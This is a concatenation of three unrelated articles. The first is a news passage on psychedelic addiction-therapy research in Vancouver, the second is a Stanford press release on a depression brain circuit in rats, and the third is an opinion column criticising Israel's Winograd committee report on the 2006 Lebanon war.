Meantime , ayahuasca , another psychedelic plant brew said to treat addiction , can be purchased at The Urban Shaman on Hastings Street , and a Vancouver group called Traditional Amazonian Medicines Society ( TAMS ) organizes trips to Peru for locals looking to sample ayahuasca in the remote jungles with an Amazonian healer .
Unlike LSD and ecstasy , ibogaine and ayahuasca are n't criminalized in Canada , though they are in the States , so Vancouver is in a unique position to host start - up therapy programs .
Vancouver Drug Policy Co-ordinator MacPherson has no illusions that three levels of government will quickly and easily heed the calls to embrace the therapeutic potential of some hallucinogens .
He told The Tyee that numerous clinical trials need to be carried out by researchers before the pros and cons can be weighed out and that will necessitate provincial and Health Canada approval and funding .
" Given the political climate around the NAOMI [ heroin addiction treatment with heroin ] trials , we 're on rear - guard action in terms of gains we 've already made , and do n't want to jeopardize that work , " said MacPherson .
" But I think you 'll see more interest in therapeutic psychedelics in the coming year , " MacPherson said , adding that " these types of programs are usually pushed by academics .
The Ministry and groups like the Coastal Health Authority are n't research labs .
They 'll say , ' Show me the evidence that these drugs work ' and the problem is that while there 's a lot of anecdotal evidence , there 's not much recent peer - reviewed research around psychedelics because of a completely wrong - headed approach to addiction and of course , the war on drugs . "
BC health officers : loosen laws
Opponents of using therapeutic psychedelics are difficult to find among medical researchers .
While there are a number of published medical papers around recreational users who took street ecstasy ( which is often adulterated with other drugs or toxic chemicals ) , even toxicology experts are hesitant about writing off many of these drugs .
One Canadian Medical Association Journal paper written by University of Toronto professor Harold Kalant in 2001 discussed the varied potentially fatal risks of taking street ecstasy but he added that there was " no evidence " that taking the drug would lead to addiction and even said that the drug " may be of potential value as an aid in psychotherapy " though " similar claims were made earlier for MDA , LSD and other hallucinogens but ... no lasting benefit was found in a 10 - year follow - up study of patients treated with LSD " and " no comparable study has been conducted on patients treated with MDMA . "
Kalant adds that a primary issue in doing clinical studies might be " difficulty obtaining the drug since its change in legal status . "
The Health Officers Council of B.C. gives the nod to medical uses for a broadened range of psychedelic drugs in their report " A Public Health Approach to Drug Control in Canada " released last October .
The report lays down strategies for approving and regulating various criminalized psychedelic drugs for use in clinical settings .
It points out that " drugs such as LSD and MDMA which have been shown to have potential psychotherapeutic benefits when used in controlled therapeutic environments , could be used with registered and trained psychiatrists and psychologists . "
The report concludes , " there is a growing consensus in Canada that there should be an exploration of other drug control mechanisms , with possible adoption of strict regulatory approaches to what are currently illegal drugs . "
The group calls for " a new balance point in the drug control policy spectrum , occupying the middle ground " that minimizes " the multi- faceted negative effects of harmful substance use , while also minimizing the harms caused by drug laws themselves . "
' So much potential '
Advocates realize that research groups interested in pursuing psychedelic treatment programs , particularly the criminalized substances , could have trouble convincing Health Canada to get on - side with endorsement and funding .
" But , there 's so much potential with these substances that as a society we 're missing the boat by not incorporating them into addiction treatment and psychiatric programs , " said Ken Tupper , a 36 - year - old UBC PhD student who consulted on both reports .
Tupper has been studying the cultural benefits of various psychedelic " plant teachers " for over a decade and co-founded TAMS in 2004 .
Like many academics in this field , Tupper 's interest in psychedelics started as a teen .
" Curiosity led me to experiment and I found value through taking LSD and psilocybin , " he said over mint tea at Blenz .
" I started to see the cultural hypocrisy of our drug laws while caffeine , alcohol and tobacco were legal . "
Tupper went on to SFU to do a philosophy BA , then a master 's degree in education where he researched " the value of psychedelic drugs .
I thought I 'd be laughed out of the room but they gave me a $ 5,000 fellowship to travel to Brazil and study ayahuasca . "
Tupper took ayahuasca in ceremonial settings and said the experience changed his life .
" Taking this difficult and unforgiving plant teacher has made me a more complete person , " he said .
" I compare it to rebooting your brain , and think our culture seriously needs that right now .
We 're at a crisis point and these substances could be used as cultural tools to shift consciousness and to bring people a greater connection to the earth , to animals , plants , the land .
The war on drugs has intimidated academics for a couple of decades but we 're seeing a re-emerged interest everywhere . "
Interest in U.S .
The recommendations in the reports by the city of Vancouver and the Health Officers Council of B.C. have also turned on American researchers .
" Those reports touch on the vanguard of treatment efforts with substance abuse and are a common - sense approach to drug abuse treatment and harm reduction , " said Dennis McKenna , an ethnopharmacologist and psychedelic drug researcher based in Minnesota who plans to return to Vancouver to research Amazonian plants this September at BCIT .
McKenna , a " child of the 60s , " started sampling psychedelics in the Haight - Ashbury , area of San Francisco , then split for the Amazon to sample psilocybin with his brother Terrence , who detailed their trips in the book True Hallucinations .
McKenna moved on to the academic side of research at UBC in the early 1980s doing his doctorate in Botanical Sciences under Neil Towers .
They were studying the genetics of psilocybin biosynthesis when Towers asked him if he'd be interested in going to the Amazon to study medicinal plants , particularly ayahuasca .
McKenna responded , " My bags are packed .
When do I go ? "
When he returned , McKenna landed a four - year fellowship researching ayahuasca pharmacology , then went to Brazil with UCLA - based Charles Grob to do a biomedical study of the safety of ayahuasca for the Brazilian government .
" Most of the people we studied were very dysfunctional before joining the UDV church : drug abuse , domestic violence , crime .
But when they started drinking the tea in the ceremonial setting , it was like holding up a mirror to their lives .
They literally changed their lives . "
The researchers also found an intriguing bio-chemical marker in long - term ayahuasca drinkers .
" It suggested ayahuasca may have reversed a neurochemical condition involving lower abundance of serotonin transporters that had been linked to alcoholism by other researchers , " said McKenna , who acknowledges that further research would be necessary to confirm this , and notes that the UDV's " supportive social environment " was a factor in improved health .
But the Brazilian government was impressed enough to approve ayahuasca for ceremonial uses .
The American government has been harder to persuade , but recently McKenna and his colleagues at The Heffter Research Institute have started various projects with psychedelics .
Harvard researchers , meanwhile , are hoping to use MDMA to treat anxiety and pain in cancer patients .
It 's the first time academics there have tested the bureaucrats around psychedelics since Timothy Leary 's infamous LSD experiments were halted by the institution in the early 60s .
A similar program is already underway at UCLA Medical Center , with psilocybin .
And Johns Hopkins University just released a randomized controlled trial of the spiritual mind - expanding impact of psilocybin ; one third of volunteers rated it the " single most spiritually significant " event of their lives .
In South Carolina , psychiatrist Dr. Michael Mithoefer is using MDMA to treat post - traumatic stress disorder and depression .
' No money to be made '
Florida - based Multidisciplinary Association for Psychedelic Studies ( MAPS ) is helping various projects get off the ground .
MAPS founder , Rick Doblin , said open - minded government bureaucrats are also helping to shift the tide .
" Some good people got into positions of authority at the FDA and NIDA [ National Institute of Drug Awareness ] and have made a decision to back science instead of the war on drugs , " said Doblin , acknowledging that another primary issue stalling research in the field is lack of industry funding .
" There 's no money to be made from psychedelic drugs , so the pharmaceutical companies are n't interested .
They like drugs that you have to take for your whole life and with psychedelic drugs you only need a few sessions , " said Doblin , who completed a PhD at Harvard focused on the medical uses of psychedelics and marijuana .
Doblin's not shy about saying he takes psychedelics periodically at critical life junctures , like his 50th birthday .
" Sometimes these experiences are really hard and force you to look at things you do n't want to analyse about yourself , " said Doblin .
" They can also give you a sense of unity with the world that our alienating western culture does n't provide .
You realize you 're not just isolated atoms floating alone so it gives very basic life - force connections .
And the medical studies of benefits stand on their own merit . "
MAPS is assisting the Vancouver Iboga Therapy House group to re-start its program to treat drug and alcohol addiction with the African shrub bark psychedelic .
Though many of Marc Emery 's initial ibogaine patients were unable to kick their habits long - term , Doblin is hoping to get funds for a long - term study of 20 ibogaine - using patients .
He said ibogaine was one of the most profound trips of his life .
" I threw up for 12 hours straight and then I saw all of my worst flaws and hated myself , then became exhausted and had a beautiful night of bliss and self - acceptance , " said Doblin of the experience .
Other anecdotal reports of physical purging and psychological self - recrimination make it the kind of substance few people would dabble with recreationally .
Ayahuasca , known as the " vine of the gods " is a difficult plant teacher as well .
Vancouver - born ethnobotanist Wade Davis described his ayahuasca experiences this way in his book Shadows of the Sun : " It is not necessarily , and in fact is rarely , a pleasant or an easy journey .
It is wondrous and it may be terrifying .
But above all , it is culturally purposeful . "
Ayahuasca 's spiritual and cultural benefits , particularly for addicts , has been well documented and Vancouver - based non-profit group TAMS is advocating educational exchanges between local aboriginals and Peruvian indigenous cultures and hoping to open a centre on B.C. 's west coast .
Ken Tupper is also just back from the second TAMS - organized workshop in Peru along with eight local " travellers " who attended ceremonies with master healer Guillermo Arevalo in the remote jungles .
Their next 13 - day excursion is planned for this fall .
Saskatchewan roots
The term " psychedelic " was actually coined in Saskatchewan by Humphrey Osmond , one of the first doctors to use LSD in the early 1950s at Weyburn Psychiatric Hospital .
Osmond and his colleague Abram Hoffer ( who still works out of Victoria and has just published his biography ) treated alcoholics with LSD and their trials showed that a majority of patients kicked the habits after LSD treatment .
Studying the effects of the drug also allowed Osmond and Hoffer to make a critical connection between mental disorders and neurochemistry ; Osmond also sampled LSD and mescaline himself and arranged Aldous Huxley 's first psychedelic trip .
Artists , academics , doctors , students , accountants and housewives around the globe were soon sampling psychedelics and by 1962 more than 1,000 articles had been published in medical journals about LSD alone .
But New Westminster - based Hollywood Hospital was the first clinical setting to use a laid - back beanbag chair - style setting for addiction treatment and the place became popular with celebs like Cary Grant , Andy Williams and Ethel Kennedy .
It was even endorsed by the local Catholic church until LSD was criminalized , thanks largely to public hysteria around a handful of negative media reports as well as inhumane psychedelics experiments done by the CIA - backed programs like MK - ULTRA which was linked with researchers in the U.S. and Canada , including psychiatrist Ewen Cameron 's infamous LSD experiments at Allen Memorial Institute in Montreal .
Today 's researchers and advocates are necessarily cautious about the various ways these powerful substances could be used and potentially abused by big business , government , the tourist industry and psychiatrists .
While neither the old - school flower - power advocates or the younger generation raised in the coke - fueled 1980s are booting around in painted buses , there is concern about the psychedelic experience becoming too clinical or consumerized .
" I 'd hate to see it pharmaceuticalized : take two tabs and call me in the morning , " said McKenna .
" It ca n't be used as a shortcut to enlightenment .
You also need to have a supportive community . "

Scientists ' hunt for the cause of depression has implicated so many suspects and found so many treatments with different mechanisms that the condition remains an enigma .
Now researchers at the Stanford University School of Medicine have identified one unifying principle that could explain how a range of causes and treatments for depression converge .
They found that in rats the differing mechanisms of depression and its treatment in the end appear to funnel through a single brain circuit .
Changes in how the electrical signals spread through the circuit appear to be the cause of depression - related behavior , according to their study .
" I think this will help us make sense of how there can be so many different causes and treatments of depression , " said senior author Karl Deisseroth , MD , PhD , assistant professor of bioengineering and of psychiatry and behavioral sciences .
" It also helps us understand conceptually how something that seems as hard to get traction on as depression can have a really quantitative , concrete basis . "
The work also may have implications for the search for new treatments for depression .
" You can use that common pathway as the most efficient , most direct targeted way to find truly specific treatments , " he said .
Deisseroth , who sees many depressed patients in clinic , said he has come to appreciate how the bumps in the road that most people see as normal obstacles in life become insurmountable hurdles to depressed people , causing them to lapse into helplessness .
Reasoning that the brain is essentially a complex electrical circuit , Deisseroth 's team set out to test the theory of whether brain circuitry malfunction could be at the root of depression .
To explore the idea in a precise , quantitative way , they needed to develop a visualization tool that was faster and sharper than brain imaging systems currently available , such as MRI or CT scans .
Raag Airan , an MD / PhD student in Deisseroth 's lab and co-first author of the study , led the development of a technique called voltage - sensitive dye imaging for this model .
This technique allows intact brain circuits to be viewed in real time , enabling the researchers to watch living neurons in action , across entire brain networks .
The system uses a fluorescent dye , sensitive to brain circuit activity , which the researchers introduce into the animal brain tissue .
As dyed circuits light up and darken again in response to electrical activity , very fast high - resolution cameras capture the action .
The researchers can observe how different stimuli received by the animal , such as a dose of an antidepressant drug , affect circuit operation .
The researchers used slices of rat brain , Deisseroth said , " like a computer repair technician would take out a circuit board " to test its functional properties .
The brain slices , which remain active for many hours , came from parts of the hippocampus , a region long implicated in depression .
They also tested slices from rats treated with the antidepressant medications fluoxetine and imipramine .
The team carried out the study using a standard rat model of depression .
Even though the rats do not mimic the entire complexity of genetic and environmental causes of human depression , Deisseroth explained , the animals exhibit similar symptoms and also get better from the same medications that work on humans .
In these rats , they found an alteration in electrical activity flow through the brain that could be corrected by human antidepressants .
The extent that the signal spread through the brain sample was diminished in the " depressed " rats , a crucial finding that would not be apparent with other experimental methods , Deisseroth said .
They needed to be able to image a whole circuit simultaneously - and very rapidly - to see the effect .
" What surprised me most was how specifically the measure tracked the depression - related behavior , " said Airan .
" We usually think of psychiatric disorders as fuzzy and intractable , and this study showed me that , with the right tools , we could really put psychiatry on a quantitative framework . "
Leslie Meltzer , neurosciences graduate student and co-first author , searched for the cellular basis of these changes in circuitry .
An obvious place to start , she said , was to look at the formation of new neurons in the hippocampus , a process that neuroscientists have suggested is at the root of how antidepressants work .
What they found was that the growth of new neurons could account for the behavioral improvements seen from treatment as well as the circuitry changes .
The converse was not true :
Fewer new neurons in that region did not equal depression .
In other words , in their model system , the two states appear to funnel through a common pathway - despite very different cellular mechanisms .
" The holy grail of psychiatry is to try to find final common pathways that can make sense of how genes and life experiences end up with the same result , " said Deisseroth .
" And the same goes for medications .
There are many treatments that act in fundamentally different ways - how do we make sense of all that complexity " "
Deisseroth predicted that , as noninvasive imaging of human brains gets better in the next few years , researchers will be able to measure these same quantitative measures in people as well .
" That will be a wonderful thing when that happens , " he said .
Others who contributed to this work are : Madhuri Roy , basic life sciences research associate ; Yuqing Gong , a graduate student at the time in statistics and electrical engineering , and Han Chen , a graduate student in electrical engineering .
This work was funded by the National Institutes of Health ( including Deisseroth's Pioneer Award ) ; NARSAD ; APIRE ; the Snyder , Culpeper , Coulter , Klingenstein , Whitehall , McKnight and Albert Yu and Mary Bechmann foundations ; the Medical Scientist Training Program ; and a Stanford Bio - X predoctoral fellowship .

The Winograd committee of inquiry is not a part of the solution .
It is a part of the problem .
Now , after the first excitement caused by the publication of the partial report has died down , it is possible to evaluate it .
The conclusion is that it has done much more harm than good .
The positive side is well known .
The committee has accused the three directors of the war  the prime minister , the minister of defense , and the chief of staff  of many faults .
The committee ’s favorite word is “ failure . "
It is worthwhile to ponder this word .
What does it say ?
A person “ fails ” when he does not fulfill his task .
The nature of the task itself is not considered , but only the fact that it has not been accomplished .
The use of the word “ failure ” all over the report is by itself a failure of the committee .
The new Hebrew word invented by the protest groups  something like “ ineptocrats ”  fits all of the five committee members .
In what did the three musketeers of the war leadership fail , according to the committee ?
The decision to go to war was taken in haste .
The war aims proclaimed by the prime minister were unrealistic .
There was no detailed and finalized military plan .
There was no orderly staff - work .
The government adopted the improvised proposal of the chief of staff at it was , without alternatives being offered or requested .
The chief of staff thought that he would win by bombing and shelling alone .
No ground attack was planned .
The reserves were not called up in time .
The ground campaign got off very late .
In the years before the war , the forces were not properly trained .
Much equipment was missing from the emergency stores .
The big ground attack , which cost the lives of so many soldiers , started only when the terms of the cease - fire were already agreed upon in the UN .
Strong medicine .
What is the conclusion ?
That we must learn these lessons and improve our performance quickly , before we start the next war .
And indeed , a large part of the public drew precisely this conclusion : the three “ ineptocrats ” have to be removed , their place has to be filled by three leaders who are more responsible and “ experienced , " and we should then start Lebanon War III , so as to repair the damage caused by Lebanon War II .
The army has lost its deterrent power ?
We shall get it back in the next war .
There was no successful ground attack ?
We shall do better next time .
In the next war , we shall penetrate deeper .
The entire problem is technical .
New leaders with military experience , orderly staff - work , meticulous preparations , an army chief from the ranks of the ground forces instead of a flying commander  and then everything will be OK .
The most important part of the report is the one that is not there .
The report is full of holes , like the proverbial Swiss cheese .
There is no mention of the fact that this was from the start a superfluous , senseless , and hopeless war .
Such an accusation would be very serious .
A war causes death and destruction on both sides .
It is immoral to start one unless there is a clear danger to the very existence of the state .
According to the report , Lebanon War II had no specific aim .
That means that this war was not forced on us by any existential necessity .
Such a war is a crime .
What did the trio go to war for ?
In theory : in order to free the two captured soldiers .
This week , Ehud Olmert admitted publicly that he knew quite well that the soldiers could not be freed by war .
That means that when he decided to start the war , he blatantly lied to the people , George Bush - style .
Hezbollah , too , does not present an existential danger to the state of Israel .
An irritation ?
Yes .
A provocative enemy ?
Absolutely .
An existential danger ?
Surely not .
For these problems , political solutions could be found .
It was clear then , as it is now , that the prisoners must be freed through a prisoner - exchange deal .
The Hezbollah threat can be removed only by political means , since it stems from political causes .
The committee accuses the government of not examining military alternatives to the chief of staff ’s proposals .
By the same token , the committee itself can be accused of not examining political alternatives to the government ’s decision to go to war .
Hezbollah is primarily a political organization , a part of the complex reality of Lebanon .
For centuries , the Shi’ites in south Lebanon were downtrodden by the stronger communities  the Maronites , the Sunnis , and the Druze .
When the Israeli army invaded Lebanon in 1982 , the Shi’ites received them as liberators .
After it became apparent that our army did not intend to go away , the Shi’ites started a war of liberation against them .
Only then , in the course of the long and ultimately successful guerilla war , did the Shi’ites emerge as a major force in Lebanon .
If there were justice in the world , Hezbollah would erect statues of Ariel Sharon .
In order to strengthen their position , the Shi’ites needed help .
They got it from the Islamic Republic of Iran , the natural patron of all the Shi’ites in the region .
But even more important was the help coming from Syria .
And why did Sunni Syria come to the aid of the Shi’ite Hezbollah ?
Because it wanted to create a double threat : against the government in Beirut and against the government in Jerusalem .
Syria has never given up its foothold in Lebanon .
In the eyes of the Syrians , Lebanon is an integral part of their homeland , which was torn from it by the French colonialists .
A look at the map is sufficient to show why Lebanon is so important for Syria , both economically and militarily .
Hezbollah provides Syria with a stake in the Lebanese arena .
The encouragement and support of Hezbollah as a threat against Israel is even more important for Syria .
Damascus wants to regain the Golan Heights , which were conquered by Israel in 1967 .
This , for Syrians , is a paramount national duty , a matter of national pride , and they will not give it up for any price .
They know that for now , they cannot win a war against Israel .
Hezbollah offers an alternative : continual pinpricks that are intended to remind Israel that it might be worthwhile to return the Golan .
Anyone who ignores this political background and sees Hezbollah only as a military problem shows himself to be an ignoramus .
It was the duty of the committee to say so clearly , instead of prattling on about “ orderly staff - work ” and “ military alternatives . "
It should have issued a red card to the three ineptocrats for not weighing the political alternative to the war : negotiations with Syria for neutralizing the Hezbollah threat by means of an Israeli - Syrian - Lebanese accord .
The price would have been an Israeli withdrawal from the Golan Heights .
By not doing so , the committee really said : there is no escape from Lebanon War III .
But please , folks , try harder next time .
A conspicuous hole in the report concerns the international background of the war .
The part played by the United States was obvious from the first moment .
Olmert would not have decided to start the war without obtaining explicit American permission .
If the U.S. had forbidden it , Olmert would not have dreamed of starting it .
George Bush had an interest in this war .
He was ( and is ) stuck in the Iraqi morass .
He is trying to put the blame on Syria .
Therefore he wanted to strike a blow against Damascus .
He also wanted to break the Lebanese opposition , in order to help America ’s proxy in Beirut .
He was sure that it would be a cakewalk for the Israeli army .
When the expected victory was late in coming , American diplomacy did everything possible to prevent a cease - fire , so as to “ give time ” to the Israeli army to win .
That was done almost openly .
How much did the Americans dictate to Olmert the decision to start the war , to bomb Lebanon ( but not the infrastructure of the Siniora government ) , to prolong the war , and to start a ground offensive at the last moment ?
We do n’t know .
Perhaps the committee dealt with this in the secret part of the report .
But without this information it is impossible to understand what happened , and therefore the report is to a large extent worthless for understanding the war .
What else is missing in the report ?
Hard to believe , but there is not a single word about the terrible suffering inflicted on the Lebanese population .
Under the influence of the chief of staff , the government agreed to a strategy that said : let ’s bomb Lebanon , turn the life of the Lebanese into hell , so they will exert pressure on their government in Beirut , which will then disband Hezbollah .
It was slavish imitation of the American strategy in Kosovo and Afghanistan .
This strategy killed about a thousand Lebanese and destroyed whole neighborhoods , bridges , and roads , and not only in Shi’ite areas .
From the military point of view , that was easy to do , but the political price was immense .
For weeks pictures of the death and destruction wrought by Israel dominated world news .
It is impossible to measure the damage done to Israel ’s standing in world public opinion , damage that is irreversible and that will have lasting consequences .
All this did not interest the committee .
It concerned itself only with the military side .
The political side it ignored , except to remark that the foreign minister was not invited to the important consultations .
The moral side was not mentioned at all .
Nor is the occupation mentioned .
The committee ignores a fact that cries out to heaven : that an army cannot be capable of conducting a modern war when for 40 years it has been employed as a colonial police force in occupied territories .
An officer who acts like a drunken Cossack against unarmed peace activists or stone - throwing children , as shown this week on television , cannot lead a company in real war .
That is one of the most important lessons of Lebanon War II : the occupation has corrupted the Israeli army to the core .
How can this be ignored ?
The committee judges Olmert and Peretz as unfit because of their lack of “ experience , " meaning military experience .
This can lead to the conclusion that the Israeli democracy cannot rely on civilian leaders , that it needs leaders who are generals .
It imposes on the country a military agenda .
That may well be the most dangerous result .
This week I saw on the Internet a well - done presentation by the Reservists , a group of embittered reserve soldiers set up to lead the protest against the three “ ineptocrats . "
It shows , picture after picture , many of the failures of the war and reaches its climax with the statement that the incompetent political leadership did not allow the army to win .
The young producers of this presentation are certainly unaware of the unpleasant smell surrounding this idea , the odor of the Dolchstoss im Ruecken  the stab in the back of the army .
Otherwise they would probably not have expressed themselves in this form , which served not so long ago as the rallying cry of German fascism .
